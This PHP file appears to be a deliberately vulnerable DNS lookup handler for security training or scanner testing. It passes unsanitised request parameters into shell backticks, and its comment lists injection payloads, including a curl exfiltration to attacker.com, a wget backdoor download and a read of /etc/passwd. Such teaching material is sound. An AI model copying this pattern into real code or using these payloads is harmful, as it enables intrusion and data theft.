<?php
/*
 * DNS Lookup Handler
 *
 * VULNERABILITY: Command Injection via PHP Backticks (SAST - Critical)
 *
 * ISSUE:
 * PHP backticks (`) execute shell commands. User input is interpolated
 * directly into the command without sanitization or escaping.
 *
 * ATTACK VECTOR:
 * If user submits: ns_dig = "8.8.8.8; whoami"
 * The command becomes: dig @8.8.8.8; whoami -t ns example.com
 * This executes TWO commands: dig, then whoami
 *
 * REAL-WORLD EXPLOITATION:
 * - Read sensitive files: 8.8.8.8; cat /etc/passwd
 * - Exfiltrate data: 8.8.8.8; curl attacker.com/$(whoami)
 * - Install backdoors: 8.8.8.8; wget attacker.com/shell.php
 * - Escalate privileges: 8.8.8.8; sudo su
 *
 */

// Include config (not actually used, but demonstrates secrets in codebase)
require_once 'config.php';

$results = null;
$error = null;

// Check if form was submitted
if (isset($_GET['domain'])) {

    // Get domain from user input
    $domain = $_GET['domain'] ?? 'example.com';

    // Parse DNS servers from comma-separated input
    // Example: "8.8.8.8,1.1.1.1" → ['8.8.8.8', '1.1.1.1']
    if (isset($_GET['ns_dig']) && !empty($_GET['ns_dig'])) {
        $ns_dig = explode(',', $_GET['ns_dig']);
    } else {
        // Default to Google's public DNS
        $ns_dig = ['8.8.8.8', '8.8.4.4'];
    }

    // Validate we have at least one DNS server
    if (count($ns_dig) > 0) {

        // ================================================================
        // 🚨 VULNERABLE CODE - Command Injection via Backticks
        // ================================================================
        // No input sanitization, validation, or escaping
        // User controls $ns_dig[0] and $domain directly

        $first = `dig @$ns_dig[0] -t ns $domain`;

        // Query second DNS server if provided
        if (count($ns_dig) > 1) {
            $second = `dig @$ns_dig[1] -t ns $domain`;
        } else {
            $second = null;
        }

        // Store results for display
        $results = [
            'first' => $first,
            'second' => $second,
            'dns_servers' => $ns_dig,
            'domain' => $domain
        ];

    } else {
        $error = "Please provide at least one DNS server.";
    }
}

// Pass results back to index.php for display
// (In this simple app, we include this file directly)
